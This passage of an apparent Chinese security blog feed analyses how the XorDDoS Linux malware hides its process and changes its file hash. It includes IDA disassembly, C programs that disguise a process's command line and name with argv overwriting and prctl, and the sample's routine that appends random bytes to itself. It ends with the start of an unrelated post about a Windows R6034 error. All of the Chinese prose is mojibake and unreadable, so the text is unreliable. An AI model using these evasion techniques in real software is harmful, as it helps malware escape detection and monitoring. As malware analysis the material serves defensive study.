class="hljs-built_in">esi</span><br><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œäº†è¿™å‡ å¥ä»£ç åï¼Œæ ˆå›¾å‘ç”Ÿäº†å˜åŒ–</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-00000018 argv            arg_0                       ; offset</span><br><span class="hljs-deletion">-00000014 var_14          dd ?</span><br><span class="hljs-deletion">-00000010 var_10          dd ?</span><br><span class="hljs-deletion">-0000000C var_C           dd ?</span><br><span class="hljs-deletion">-00000008 var_8           dd ?</span><br><span class="hljs-deletion">-00000004 var_4           dd ?</span><br><span class="hljs-addition">+00000000  s              db 4 dup(?)</span><br><span class="hljs-addition">+00000004  r              db 4 dup(?)</span><br><span class="hljs-addition">+00000008 file            dd ?                    ; offset</span><br><span class="hljs-addition">+0000000C arg_4           dd ?</span><br><span class="hljs-addition">+00000010 arg_8           dd ?</span><br></code></pre></td></tr></table></figure><p>å†çœ‹è¿™å‡ å¥ä»£ç </p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">08048576</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+arg_4]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048579</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+argv], <span class="hljs-built_in">esi</span><br>...<br><span class="hljs-symbol">.text:</span>0804857F                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_14], <span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œäº†è¿™å‡ å¥ä»£ç åï¼Œæ ˆå›¾å‘ç”Ÿäº†å˜åŒ–</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-00000018 argv            arg_0                   ; offset</span><br><span class="hljs-deletion">-00000014 var_14          arg_4</span><br><span class="hljs-deletion">-00000010 var_10          dd ?</span><br><span class="hljs-deletion">-0000000C var_C           dd ?</span><br><span class="hljs-deletion">-00000008 var_8           dd ?</span><br><span class="hljs-deletion">-00000004 var_4           dd ?</span><br><span class="hljs-addition">+00000000  s              db 4 dup(?)</span><br><span class="hljs-addition">+00000004  r              db 4 dup(?)</span><br><span class="hljs-addition">+00000008 file            dd ?                    ; offset</span><br><span class="hljs-addition">+0000000C arg_4           dd ?</span><br><span class="hljs-addition">+00000010 arg_8           dd ?</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯è¿™å‡ å¥ä»£ç </p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">08048582</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+arg_8]ï¼›<span class="hljs-built_in">eax</span> = pid<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048585</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_10], <span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œäº†è¿™å‡ å¥ä»£ç åï¼Œæ ˆå›¾å‘ç”Ÿäº†å˜åŒ–</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-00000018 argv            arg_0                   ; offset</span><br><span class="hljs-deletion">-00000014 var_14          arg_4</span><br><span class="hljs-deletion">-00000010 var_10          arg_8</span><br><span class="hljs-deletion">-0000000C var_C           0</span><br><span class="hljs-deletion">-00000008 var_8           dd ?</span><br><span class="hljs-deletion">-00000004 var_4           dd ?</span><br><span class="hljs-addition">+00000000  s              db 4 dup(?)</span><br><span class="hljs-addition">+00000004  r              db 4 dup(?)</span><br><span class="hljs-addition">+00000008 file            dd ?                    ; offset</span><br><span class="hljs-addition">+0000000C arg_4           dd ?</span><br><span class="hljs-addition">+00000010 arg_8           dd ?</span><br>`<br></code></pre></td></tr></table></figure><p>mainå‡½æ•°ä¸­å¯¹LinuxExec_Argv2 çš„è°ƒç”¨çš„ä¸ºä»£ç ä¸º</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">LinuxExec_Argv2(&#x27;æœ¨é©¬è·¯å¾„&#x27;, &#x27;ä¼ªè£…å‘½ä»¤è¡Œ&#x27;, pid);<br></code></pre></td></tr></table></figure><p>å› æ­¤æœ€åè°ƒç”¨çš„execvpçš„ä¼ªä»£ç ä¸º</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">execvp</span>(&#x27;æœ¨é©¬è·¯å¾„&#x27;, argv);<br></code></pre></td></tr></table></figure><p>å°†è¿›å…¥ main å‡½æ•°å‚æ•°ä¸ªæ•°ä¸º3çš„æµç¨‹ï¼Œç”¨IDAé‡å‘½ååï¼Œå…³é”®ä»£ç ä¸º</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs maxima">text:<span class="hljs-number">0804B5D3</span> PARAM_NUM_3:                            ; CODE XREF: main+3CDj<br><br>.text:<span class="hljs-number">0804B5D3</span>                 lea     eax, [ebp+var_18]<br>.text:<span class="hljs-number">0804B5D6</span>                 mov     [esp+<span class="hljs-number">4</span>], eax<br>.text:<span class="hljs-number">0804B5DA</span>                 lea     eax, [ebp+self_path]<br>.text:<span class="hljs-number">0804B5E0</span>                 mov     [esp], eax<br>.text:<span class="hljs-number">0804B5E3</span>                 call    readfile<br>.text:<span class="hljs-number">0804B5E8</span>                 mov     edx, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B5EE</span>                 mov     ebx, [edx+<span class="hljs-number">4</span>]<br>.text:<span class="hljs-number">0804B5F1</span>                 mov     [ebp+self_file_content], eax<br>.text:<span class="hljs-number">0804B5F7</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B5FA</span>                 call    strlen<br>.text:<span class="hljs-number">0804B5FF</span>                 mov     [esp+<span class="hljs-number">4</span>], ebx<br>.text:<span class="hljs-number">0804B603</span>                 mov     [esp+<span class="hljs-number">8</span>], eax<br>.text:<span class="hljs-number">0804B607</span>                 lea     eax, [ebp+fake_cmd]<br>.text:<span class="hljs-number">0804B60D</span>                 mov     [esp], eax<br>.text:<span class="hljs-number">0804B610</span>                 call    memmove<br>.text:<span class="hljs-number">0804B615</span>                 mov     dword ptr [esp+<span class="hljs-number">0Ch</span>], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B61D</span>                 mov     dword ptr [esp+<span class="hljs-number">8</span>], <span class="hljs-number">0Ah</span><br>.text:<span class="hljs-number">0804B625</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B62D</span>                 mov     edx, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B633</span>                 mov     eax, [edx+<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">0804B636</span>                 mov     [esp], eax<br>.text:<span class="hljs-number">0804B639</span>                 call    __strtol_internal<br>.text:<span class="hljs-number">0804B63E</span>                 mov     esi, eax<br>.text:<span class="hljs-number">0804B640</span>                 mov     eax, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B646</span>                 mov     ebx, [eax]<br>.text:<span class="hljs-number">0804B648</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B64B</span>                 call    strlen<br>.text:<span class="hljs-number">0804B650</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B653</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B65B</span>                 mov     [esp+<span class="hljs-number">8</span>], eax<br>.text:<span class="hljs-number">0804B65F</span>                 call    memset<br>.text:<span class="hljs-number">0804B664</span>                 mov     edx, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B66A</span>                 mov     ebx, [edx+<span class="hljs-number">4</span>]<br>.text:<span class="hljs-number">0804B66D</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B670</span>                 call    strlen<br>.text:<span class="hljs-number">0804B675</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B678</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B680</span>                 mov     [esp+<span class="hljs-number">8</span>], eax<br>.text:<span class="hljs-number">0804B684</span>                 call    memset<br>.text:<span class="hljs-number">0804B689</span>                 mov     eax, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B68F</span>                 mov     ebx, [eax+<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">0804B692</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B695</span>                 call    strlen<br>.text:<span class="hljs-number">0804B69A</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B69D</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B6A5</span>                 mov     [esp+<span class="hljs-number">8</span>], eax<br>.text:<span class="hljs-number">0804B6A9</span>                 call    memset<br>.text:<span class="hljs-number">0804B6AE</span>                 lea     edx, [ebp+fake_cmd]<br>.text:<span class="hljs-number">0804B6B4</span>                 mov     [esp+<span class="hljs-number">4</span>], edx<br>.text:<span class="hljs-number">0804B6B8</span>                 mov     edx, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B6BE</span>                 mov     eax, [edx]<br>.text:<span class="hljs-number">0804B6C0</span>                 mov     [esp], eax<br>.text:<span class="hljs-number">0804B6C3</span>                 call    strcpy<br>.text:<span class="hljs-number">0804B6C8</span>                 lea     eax, [ebp+filename]<br>.text:<span class="hljs-number">0804B6CE</span>                 mov     [esp+<span class="hljs-number">0Ch</span>], esi<br>.text:<span class="hljs-number">0804B6D2</span>                 lea     esi, [ebp+randstr_10]<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç çš„åŸç†å¤§è‡´ç­‰åŒäºä¸‹é¢è¿™æ®µä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>&#123;<br>    <span class="hljs-type">char</span> fake_cmd[<span class="hljs-number">256</span>];<br>    <span class="hljs-built_in">memset</span>(&amp;fake_cmd, <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);<br>    <span class="hljs-type">char</span> * argv_arr_1 = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> argv_arr_1_length = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length);<br>    <span class="hljs-type">long</span> pid_long = strtol(argv[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br>    <span class="hljs-type">char</span> * v29 = (<span class="hljs-type">char</span> *)*argv;<br>    <span class="hljs-type">int</span> v30 = <span class="hljs-built_in">strlen</span>(*argv);<br>    <span class="hljs-built_in">memset</span>(v29, <span class="hljs-number">0</span>, v30);<br>    <span class="hljs-type">char</span> * v31 = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> v32 = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">memset</span>(v31, <span class="hljs-number">0</span>, v32);<br>    <span class="hljs-type">char</span> * v33 = argv[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> v34 = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">memset</span>(v33, <span class="hljs-number">0</span>, v34);<br>    <span class="hljs-built_in">strcpy</span>(*argv, fake_cmd);<br>    sleep(<span class="hljs-number">300</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘åæ‰§è¡Œå¯ä»¥çœ‹åˆ°æ•ˆæœå’Œè¿è¡Œæ ·æœ¬çš„ä¸€æ ·ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">âœ  ~ gcc -o fakeexe exe.c<br>âœ  ~ ./fakeexe <span class="hljs-string">&quot;ls -al&quot;</span> 2554<br><br>âœ  ~ <span class="hljs-built_in">cat</span> /proc/2605/cmdline<br><span class="hljs-built_in">ls</span> -al<br><br>âœ  ~ <span class="hljs-built_in">ls</span> -l /proc/2605/exe<br>lrwxrwxrwx. 1 henices henices 0 8æœˆ   2 12:01 /proc/2605/exe -&gt; /home/henices/research/xorddos/fakeexe<br><br>âœ  ~ ps -elf | grep <span class="hljs-string">&quot;ls -al&quot;</span> | grep -v grep<br>0 S henices   2605 25307  0  80   0 -  1043 hrtime 12:01 pts/5    00:00:00 <span class="hljs-built_in">ls</span> -al<br></code></pre></td></tr></table></figure><p>å…¶å®æ•ˆæœå¹¶ä¸å¥½ï¼Œå¯ä»¥è½»æ˜“å‘ç°è¸ªè¿¹ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">âœ  ~ <span class="hljs-keyword">ps</span> -<span class="hljs-keyword">e</span> | <span class="hljs-keyword">grep</span> fakeexe<br> <span class="hljs-number">2605</span> <span class="hljs-keyword">pts</span>/<span class="hljs-number">9</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> fakeexe<br><br></code></pre></td></tr></table></figure><p>å…¶å®æœ‰æ›´å¥½çš„åšæ³•ï¼Œä½¿ç”¨ prctl ï¼Œè‡³å°‘å¯ä»¥æŠŠpsç»™æå®šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>&#123;<br>    <span class="hljs-type">char</span> fake_cmd[<span class="hljs-number">256</span>];<br>    <span class="hljs-built_in">memset</span>(&amp;fake_cmd, <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);<br>    <span class="hljs-type">char</span> * argv_arr_1 = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> argv_arr_1_length = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length);<br>    <span class="hljs-type">long</span> pid_long = strtol(argv[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br>    <span class="hljs-type">char</span> * v29 = (<span class="hljs-type">char</span> *)*argv;<br>    <span class="hljs-type">int</span> v30 = <span class="hljs-built_in">strlen</span>(*argv);<br>    <span class="hljs-built_in">memset</span>(v29, <span class="hljs-number">0</span>, v30);<br>    <span class="hljs-type">char</span> * v31 = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> v32 = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">memset</span>(v31, <span class="hljs-number">0</span>, v32);<br>    <span class="hljs-type">char</span> * v33 = argv[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> v34 = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">memset</span>(v33, <span class="hljs-number">0</span>, v34);<br>    <span class="hljs-built_in">strcpy</span>(*argv, fake_cmd);<br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;bash&quot;</span>);<br>    sleep(<span class="hljs-number">300</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘æ‰§è¡Œåå¯ä»¥çœ‹åˆ°æ•ˆæœã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">âœ  ~ ps -e | grep bash<br> 4858 pts/5    00:00:00 bash<br><br>âœ  ~ <span class="hljs-built_in">cat</span> /proc/4858/cmdline <br><span class="hljs-built_in">ls</span> -al<br><br>âœ  ~ lsof -d txt | grep fakeexe<br>bash       4858 henices txt       REG  253,2      8816  4588423 /home/henices/research/xorddos/fakeexe<br></code></pre></td></tr></table></figure><h2 id="xorddos-çš„å¤šæ€-ï¼ˆPolymorphicï¼‰"><a href="#xorddos-çš„å¤šæ€-ï¼ˆPolymorphicï¼‰" class="headerlink" title="xorddos çš„å¤šæ€ ï¼ˆPolymorphicï¼‰"></a>xorddos çš„å¤šæ€ ï¼ˆPolymorphicï¼‰</h2><p>xorddosè¿™ä¸ªæ ·æœ¬è¿˜å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™ä¸ªæ ·æœ¬ä¼šä¸æ–­å˜åŒ–ï¼Œå¤šæ€è¿™ä¸ªè¯ç¿»è¯‘çš„å¯èƒ½ä¸å¤ªå‡†ç¡®ï¼Œ<br>å¯ä»¥å‚è§ä¸Šé¢çš„è‹±æ–‡ï¼Œè‡ªè¡Œç†è§£ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">randmd5</span><span class="hljs-params">(<span class="hljs-type">char</span> *filename)</span><br>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// eax@1</span><br>  <span class="hljs-type">int</span> fd_dup; <span class="hljs-comment">// esi@1</span><br>  <span class="hljs-type">mode_t</span> v4; <span class="hljs-comment">// [sp+8h] [bp-20h]@0</span><br>  <span class="hljs-type">int</span> addr; <span class="hljs-comment">// [sp+15h] [bp-13h]@1</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [sp+19h] [bp-Fh]@1</span><br>  __int16 v7; <span class="hljs-comment">// [sp+1Dh] [bp-Bh]@1</span><br>  <span class="hljs-type">char</span> v8; <span class="hljs-comment">// [sp+1Fh] [bp-9h]@1</span><br><br>  addr = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  v7 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  fd = open(filename, <span class="hljs-number">1</span>, v4);<br>  fd_dup = fd;<br>  <span class="hljs-keyword">if</span> ( fd &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    lseek(fd, <span class="hljs-number">0</span>, SEEK_END);<br>    randstr((<span class="hljs-type">int</span>)&amp;addr, <span class="hljs-number">10</span>);<br>    write(fd_dup, &amp;addr, <span class="hljs-number">11u</span>);<br>    close(fd_dup);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>xorddos æ ·æœ¬å¤šæ€ä¸»è¦å°±æ˜¯ç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ¯æ¬¡åœ¨æ–‡ä»¶æœ«å°¾å†™ä¸Š10ä¸ªå­—èŠ‚çš„éšæœºå­—ç¬¦ã€‚<br>è¿™æ ·æ ·æœ¬md5å’Œå¤§å°éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä½¿å¾—ä¸€äº›æ£€æµ‹æ–¹æ³•å¤±æ•ˆã€‚</p><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>æ­£å› ä¸ºè¿™ç§éšè—æ–¹æ³•å¹¶ä¸ç†æƒ³ï¼Œåé¢xorddoså‡ºç°äº†å¸¦rootkitçš„ç‰ˆæœ¬ï¼Œè¿›åŒ–äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ Windows Rx034</title>
    <link href="/cn/Windows_Rx034/"/>
    <url>/cn/Windows_Rx034/</url>
    
    <content type="html"><![CDATA[<p>ä»¥å‰æ²¡æœ‰é‡ä¸Šè¿™ä¸ªé”™è¯¯ï¼Œè¿™æ¬¡é‡ä¸Šè¿™ä¸ªé”™è¯¯æ˜¯è£…vimçš„YouCompleteMeæ’ä»¶åå‡ºç°ï¼Œå› æ­¤å¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯è£…æ’ä»¶å¼•èµ·çš„è¿™ä¸ªé”™è¯¯ï¼Œé”™è¯¯æç¤ºRuntime Error å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/r5051.png" alt="error"></p><p>å…ˆæ”¾ç‹—æœä¸€ä¸‹ï¼Œå¾®è½¯çš„å¯¹R6034çš„è§£é‡Šå¦‚ä¸‹ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">An application has made <span class="hljs-keyword">an</span> attempt <span class="hljs-built_in">to</span> <span class="hljs-built_in">load</span> <span class="hljs-keyword">the</span> C runtime library <span class="hljs-keyword">without</span> <span class="hljs-keyword">using</span><br><span class="hljs-keyword">a</span> manifest. This is <span class="hljs-keyword">an</span> unsupported way <span class="hljs-built_in">to</span> <span class="hljs-built_in">load</span> Visual C++ DLLs. You need <span class="hljs-built_in">to</span><br>modify your application <span class="hljs-built_in">to</span> build <span class="hljs-keyword">with</span> <span class="hljs-keyword">a</span> manifest. For more information, see <span class="hljs-keyword">the</span><br><span class="hljs-string">&quot;Visual C++ Libraries as Shared Side-by-Side Assemblies&quot;</span> topic <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> product<br>documentation.<br></code></pre></td></tr></table></figure><p>å¾®è½¯çš„é“¾æ¥ä¸­ä¹Ÿæåˆ°äº†è§£å†³çš„æ–¹æ³•</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Rebuild your application <span class="hljs-built_in">to</span> <span class="hljs-built_in">include</span> <span class="hljs-keyword">a</span> manifest. Building <span class="hljs-keyword">an</span> application <span class="hljs-keyword">with</span><br>Visual Studio automatically puts <span class="hljs-keyword">the</span> manifest <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> resulting .exe <span class="hljs-keyword">or</span> .dll<br><span class="hljs-built_in">file</span>. If you are building <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span> <span class="hljs-title">line</span>, <span class="hljs-title">use</span> <span class="hljs-title">the</span> <span class="hljs-title">mt</span>.<span class="hljs-title">exe</span> <span class="hljs-title">tool</span> <span class="hljs-title">to</span> <span class="hljs-title">add</span> <span class="hljs-title">the</span><br>manifest <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> resource. Use resource ID <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> you build <span class="hljs-keyword">an</span> .exe, <span class="hljs-keyword">and</span> resource<br>ID <span class="hljs-number">2</span> <span class="hljs-keyword">if</span> you build <span class="hljs-keyword">a</span> .dll. For more information, see How <span class="hljs-built_in">to</span>: Embed <span class="hljs-keyword">a</span> Manifest<br>Inside <span class="hljs-keyword">a</span> C/C++ Application.<br></code></pre></td></tr></table></figure><p>å¤§æ¦‚çš„æ„æ€æ˜¯éœ€è¦ä½¿ç”¨manifest.xmlæ¥æŒ‡å®šéœ€è¦åŠ è½½çš„DLLã€‚ä¸Šç½‘åˆç¿»çœ‹äº†å‡ ä¸ªé“¾æ¥å‘ç°è¿™ä¸ªé”™è¯¯çš„æˆå› æ¯”è¾ƒå¤æ‚ï¼Œä¸»è¦åŸå› æ˜¯åŠ è½½mscvr*.dll å‡ºç°äº†é—®é¢˜ã€‚ä¸ç®¡æ€æ ·è¿˜æ˜¯å…ˆçœ‹çœ‹æ˜¯å¦ä½¿ç”¨äº† 